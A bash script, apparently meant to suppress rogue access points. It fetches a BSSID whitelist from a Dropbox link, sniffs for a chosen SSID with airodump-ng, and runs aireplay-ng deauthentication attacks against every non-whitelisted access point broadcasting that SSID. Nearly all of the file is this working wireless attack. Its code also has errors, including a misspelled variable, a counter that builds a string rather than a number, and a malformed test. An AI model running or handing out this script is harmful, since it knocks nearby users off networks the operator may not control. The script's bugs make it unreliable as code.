#!/bin/bash

# map related arguments to local variables
ssidToSearch=$1

# Load whitelistedAP from file into array data structure
wget -q --tries=10 --timeout=20 "https://www.dropbox.com/s/9jlaa0cs1sm12oo/whitelistedAP.txt?dl=1" -O whitelistedAP
fromWhitelistFile=$(cat whitelistedAP | tr "\n" " ")
echo ${fromWhitelistFile[*]}

declare -a whitelistedBSSIDArray
whitelistedBSSIDArray=($fromWhitelistFile)
#echo ${whitelistedBSSIDArray[*]}

echo "Identifying wireless interface . . ."
#lanInterface=$(eval "airmon-ng | grep 'ath9k_htc' | cut -f2")
lanInterface=$(airmon-ng | grep 'ath9k_htc' | cut -f2)
echo "The wlan interface is on: "$lanInterface
airmon-ng check kill
# airmon-ng start $lanInterface

echo "Initialising sniff on wireless network for $ssidToSearch. . ."
#airodump-ng -w wirelessEnv --output-format csv --essid $ssidToSearch $lanInterface 2>> output.txt &

airodump-ng -w wirelessEnv --output-format csv --essid $ssidToSearch $lanInterface 2>> output.txt &
PID=$!
echo $PID
sleep 10
createdFile=$(ls -t wirelessEnv* | head -1)
if test -r "$createdFile" -a -f "$createdFile"; then
  echo "Extracting result from sniff . . ."
  cat $createdFile
  # might need to convert to handle array
  declare -a bssidArray 
  declare -a channelArray
  declare -A bssidMap
  bssidArray=($(eval "cat $createdFile | grep -F '$ssidToSearch' | cut -d ',' -f1 | tr '\n' ' ' "))
  channelArray=($(eval "cat $createdFile | grep -F '$ssidToSearch' $creadtedFile | cut -d ',' -f4 | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' | tr '\n' ' ' "))
  echo "bssid array . . . ${bssidArray[*]}"
  echo "channel array . . . ${channelArray[*]}"
  
  kill -SIGTERM $PID # PLEASE DO NOT SHIFT THIS! This kills the airodump process after we retrieve all the values that we need.

  counter=0
  for i in "${bssidArray[@]}"; do
    echo "Storing $i into map with channel ${channelArray[$counter]}"
    bssidMap[$i]=${channelArray[$counter]}
    counter=$counter+1
  done
  
  if [ -n "$bssidMap"]; then
    for bssid in "${!bssidMap[@]}"; do
      echo "Checking if bssid exist within whitelist . . ."
      if [[ ! " ${whitelistedBSSIDArray[@]} " =~ " $bssid " ]]; then
        echo "Found non-whitelisted bssid . . . "
        echo "Changing wireless interface channel to ${bssidMap[$bssid]} to conduct attack. . ."
        iwconfig $lanInterface channel ${bssidMap[$bssid]}
        echo "Conducting deauthentication attack . . . $bssid"
        aireplay-ng -0 500 -a $bssid $lanInterface 
      fi
    done
  else 
    echo "[FAILURE]: Failure to find proper BSSID."
  fi
else 
  echo "[FAILURE]: Failure to find the file created."
fi


rm $createdFile



